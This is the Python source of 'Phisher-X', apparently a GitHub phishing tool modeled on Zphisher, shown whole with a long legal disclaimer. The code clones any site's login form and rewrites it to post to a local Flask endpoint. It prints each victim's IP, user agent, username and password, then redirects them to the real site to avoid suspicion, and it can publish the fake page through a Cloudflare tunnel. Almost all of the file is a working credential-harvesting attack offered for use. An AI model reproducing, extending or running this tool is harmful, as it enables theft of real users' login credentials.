##
##   Phisher-X : Automated Phishing Tool
##   Author    : idkmanegtegeg
##   Github    : https://github.com/idkmanegtegeg/Phisher-X
##
##   Inspired by Zphisher (https://github.com/htr-tech/zphisher)
##
##   LICENSE: GNU GENERAL PUBLIC LICENSE
##            Version 3, 29 June 2007
##
##   Copyright (C) 2025 YourName or YourHandle
##
##   This software is free software: you can redistribute it and/or modify
##   it under the terms of the GNU General Public License as published by
##   the Free Software Foundation, either version 3 of the License, or
##   (at your option) any later version.
##
##   This program is distributed in the hope that it will be useful,
##   but WITHOUT ANY WARRANTY; without even the implied warranty of
##   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
##   GNU General Public License for more details.
##
##   You should have received a copy of the GNU General Public License
##   along with this program. If not, see <https://www.gnu.org/licenses/>.
##
##
##   *** IMPORTANT LEGAL NOTICE AND DISCLAIMER ***
##
##   THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
##   EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
##   MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NONINFRINGEMENT.
##
##   THE AUTHOR(S) SHALL NOT BE HELD LIABLE FOR ANY DAMAGES, LOSSES,
##   OR LEGAL CONSEQUENCES ARISING DIRECTLY OR INDIRECTLY FROM THE USE,
##   MISUSE, OR UNAUTHORIZED USE OF THIS SOFTWARE.
##
##   YOU ARE SOLELY RESPONSIBLE FOR ENSURING THAT YOUR USE OF THIS SOFTWARE
##   COMPLIES WITH ALL APPLICABLE LAWS AND REGULATIONS IN YOUR JURISDICTION.
##
##   THIS SOFTWARE IS INTENDED STRICTLY FOR EDUCATIONAL PURPOSES AND FOR
##   AUTHORIZED SECURITY TESTING ONLY. PRIOR TO USING THIS SOFTWARE ON ANY
##   SYSTEM, YOU MUST OBTAIN EXPLICIT WRITTEN PERMISSION FROM THE SYSTEM OWNER.
##
##   UNAUTHORIZED USE, DISTRIBUTION, OR DEPLOYMENT AGAINST SYSTEMS YOU DO NOT
##   OWN OR HAVE PERMISSION TO TEST IS ILLEGAL AND MAY RESULT IN CRIMINAL
##   PROSECUTION, CIVIL LIABILITY, AND OTHER PENALTIES.
##
##   BY USING THIS SOFTWARE, YOU ACKNOWLEDGE THAT YOU HAVE READ THIS NOTICE,
##   UNDERSTAND THE RISKS, AND AGREE TO HOLD THE AUTHOR(S) HARMLESS FROM ANY
##   LIABILITY, CLAIMS, DAMAGES, OR LOSSES RESULTING FROM YOUR ACTIONS.
##
##   IF YOU DO NOT AGREE TO THESE TERMS, DO NOT USE THIS SOFTWARE.
##
##
##   THANKS AND CREDITS TO:
##   - Zphisher project and author TAHMID RAYAT (https://github.com/htr-tech)
##   - Contributors and open-source community members
##
##


import os
import sys
import time
import threading
import datetime
import requests
import subprocess
from flask import Flask, request, render_template_string, redirect
from bs4 import BeautifulSoup
import re
import logging
from waitress import serve


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
clear_console()

# ANSI color codes for terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

app = Flask(__name__)

CLONED_HTML = ""
TARGET_HOST = ""
SERVER_PORT = 8080

def fetch_and_modify_site(url):
    global CLONED_HTML, TARGET_HOST
    if not url.startswith("http"):
        url = "http://" + url
    TARGET_HOST = url

    print(f"{CYAN}[+] Fetching target website: {url}{RESET}")
    resp = requests.get(url)
    if resp.status_code != 200:
        print(f"{RED}[!] Failed to fetch target site.{RESET}")
        sys.exit(1)

    soup = BeautifulSoup(resp.text, "html.parser")

    # Find first form that looks like login/signup form
    form = None
    for f in soup.find_all("form"):
        inputs = f.find_all("input")
        names = [i.get("name","").lower() for i in inputs]
        if any(x in names for x in ["username", "user", "email"]) and \
           any(x in names for x in ["password", "pass"]):
            form = f
            break

    if not form:
        print(f"{RED}[!] Could not find a login/signup form on the page.{RESET}")
        sys.exit(1)

    # Rewrite form action to local capture endpoint
    form['action'] = "/login"

    # Remove external JS that might interfere or change login behavior (optional)
    for script in soup.find_all("script"):
        src = script.get("src")
        if src and (src.startswith("http") or src.startswith("//")):
            script.decompose()

    CLONED_HTML = str(soup)

def start_flask_app():
    serve(app, host="0.0.0.0", port=SERVER_PORT)

@app.route("/", methods=["GET"])
def index():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    referer = request.headers.get("Referer", "")
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    print(f"{GREEN}[+] Victim Connected: {now}{RESET}")
    print(f"    IP      : {YELLOW}{ip}{RESET}")
    print(f"    Agent   : {YELLOW}{ua}{RESET}")
    print(f"    Referer : {YELLOW}{referer}{RESET}\n")

    return render_template_string(CLONED_HTML)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    if not username:
        username = request.form.get("user", "") or request.form.get("email", "")
    password = request.form.get("password", "") or request.form.get("pass", "")

    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    referer = request.headers.get("Referer", "")
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    print(f"{MAGENTA}[+] Captured Credentials: {now}{RESET}")
    print(f"    Username: {YELLOW}{username}{RESET}")
    print(f"    Password: {YELLOW}{password}{RESET}\n")

    # Redirect victim to real site to avoid suspicion
    return redirect(TARGET_HOST)

def launch_cloudflared():
    print(f"\n{CYAN}[+] Launching Cloudflare Tunnel on port 8080...{RESET}")

    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{SERVER_PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    url_regex = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")
    start_time = time.time()

    while True:
        if proc.poll() is not None:
            print(f"{RED}[!] cloudflared exited unexpectedly.{RESET}")
            sys.exit(1)

        line = proc.stdout.readline()
        if line:
            match = url_regex.search(line)
            if match:
                public_url = match.group(0)
                print(f"{GREEN}[✓] Public phishing URL: {public_url}{RESET}\n")
                break

        if time.time() - start_time > 15:
            print(f"{RED}[!] Timeout waiting for cloudflared public URL.{RESET}")
            proc.terminate()
            sys.exit(1)

    return proc


def main():
    print(f"""
{BLUE}        ____  __  ___________ __  ____________       _  __
       / __ \/ / / /  _/ ___// / / / ____/ __ \     | |/ /
      / /_/ / /_/ // / \__ \/ /_/ / __/ / /_/ /_____|   / 
     / ____/ __  // / ___/ / __  / /___/ _, _/_____/   |  
    /_/   /_/ /_/___//____/_/ /_/_____/_/ |_|     /_/|_|  {RESET}
                                                      
    """)

    target = input(f"{YELLOW}Enter Website to Phish $ {RESET}").strip()
    if not target:
        print(f"{RED}[!] Please enter a valid URL.{RESET}")
        sys.exit(1)

    fetch_and_modify_site(target)

    print(f"\n{CYAN}[1] Localhost (testing only){RESET}")
    print(f"{CYAN}[2] Cloudflare Tunnel (public access) [DECECTED]{RESET}")
    choice = input(f"\n{YELLOW}Phisher-X $ {RESET}").strip()

    flask_thread = threading.Thread(target=start_flask_app, daemon=True)
    flask_thread.start()
    time.sleep(1)

    if choice == '1':
        print(f"{GREEN}[+] Starting local server on http://127.0.0.1:{SERVER_PORT}{RESET}")
        print(f"{YELLOW}[*] Waiting for victims... Press Ctrl+C to stop.{RESET}")
        try:
            flask_thread.join()
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Stopped by user.{RESET}")
            sys.exit(0)

    elif choice == '2':
        cloudflared_proc = launch_cloudflared()
        print(f"{YELLOW}[*] Waiting for victims... Press Ctrl+C to stop.{RESET}")
        try:
            flask_thread.join()
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Stopped by user.{RESET}")
            cloudflared_proc.terminate()
            sys.exit(0)

    else:
        print(f"{RED}[!] Invalid choice.{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()

